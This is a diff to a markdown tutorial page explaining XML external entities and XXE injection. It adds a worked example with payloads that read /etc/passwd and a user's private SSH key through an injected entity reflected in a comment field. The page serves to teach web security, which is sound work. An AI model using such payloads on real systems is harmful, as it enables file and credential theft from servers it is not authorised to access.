@@ -1,18 +1,18 @@
-# XML External Entity \(XXE Injection\)
+# XML External Entity (XXE Injection)
 
 ## XML Information
 
-XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Similar to HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format \(the "X" in "AJAX" stands for "XML"\). The format used in modern days is JSON instead.
+XML stands for "extensible markup language". XML is a language designed for storing and transporting data. Similar to HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web's history, XML was in vogue as a data transport format (the "X" in "AJAX" stands for "XML"). The format used in modern days is JSON instead.
 
-### XML Entities <a id="what-are-xml-entities"></a>
+### XML Entities <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>
 
 XML entities are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters `<` and `>`. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.
 
-### Document Type Definition <a id="what-is-document-type-definition"></a>
+### Document Type Definition <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>
 
-The XML document type definition \(DTD\) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself \(known as an "internal DTD"\) or can be loaded from elsewhere \(known as an "external DTD"\) or can be hybrid of the two.
+The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. The DTD is declared within the optional `DOCTYPE` element at the start of the XML document. The DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two.
 
-### XML Custom Entities <a id="what-are-xml-custom-entities"></a>
+### XML Custom Entities <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>
 
 XML allows custom entities to be defined within the DTD. For example:
 
@@ -20,7 +20,7 @@ XML allows custom entities to be defined within the DTD. For example:
 
 This definition means that any usage of the entity reference `&myentity;` within the XML document will be replaced with the defined value: "`my entity value`".
 
-### XML External Entities <a id="what-are-xml-external-entities"></a>
+### XML External Entities <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>
 
 XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.
 
@@ -34,7 +34,7 @@ The URL can use the `file://` protocol, and so external entities can be loaded f
 
 ## XXE Information
 
-XML external entity injection \(also known as XXE\) is a vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
+XML external entity injection (also known as XXE) is a vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
 
 ### XXE
 
@@ -90,9 +90,37 @@ Another good example is the following:
             </maintitle>
 ```
 
+### XXE Example 2
+
+The line '`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`' defines the file to read and binds it to the variable 'xxe'.
+
+Then back at the XML shown below we are going to print the contents of the file defined in the 'xxe' variable into the comment field so it is viewable.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<comment>
+  <name>Joe Hamd</name>
+  <author>Barry Clad</author>
+  <com>&xxe;</com>
+</comment>
+```
+
+#### Extra Steps
+
+If we know that a valid username has a SSH key we can attempt to read it from the common SSH location.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
+<comment>
+  <name>Joe Hamd</name>
+  <author>Barry Clad</author>
+  <com>&xxe;</com>
+</comment>
+```
+
 ## References
 
 {% embed url="https://portswigger.net/web-security/xxe" %}
-
-
 
